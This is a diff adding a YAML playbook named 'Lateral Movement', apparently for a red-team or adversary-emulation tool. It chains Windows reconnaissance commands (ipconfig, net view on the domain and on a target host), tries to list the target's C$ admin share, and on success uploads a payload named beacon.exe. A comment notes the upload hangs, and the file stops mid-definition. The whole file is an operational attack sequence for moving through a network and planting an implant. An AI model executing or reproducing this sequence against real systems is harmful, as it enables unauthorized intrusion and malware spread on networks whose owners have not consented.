@@ -1,0 +1,34 @@
+name: Lateral Movement
+# Enumerate and move laterally to other systems
+
+actions:
+  # Get network information
+  - name: network_enum
+    type: shell
+    parameters:
+      command: ipconfig /all
+
+  # List domain computers
+  - name: domain_computers
+    type: shell
+    parameters:
+      command: net view /domain
+
+  # Check SMB shares on network
+  - name: smb_shares
+    type: shell
+    parameters:
+      command: net view \\target-host
+
+  # Attempt to access admin shares
+  - name: test_admin_access
+    type: shell
+    parameters:
+      command: dir \\target-host\c$
+    on_success:
+      - name: upload_tool
+        type: upload
+        parameters:
+          local_path: /opt/payloads/beacon.exe
+          # Upload currently hangs indefinitely due to API responding forever with IN_PROGRESS
+       
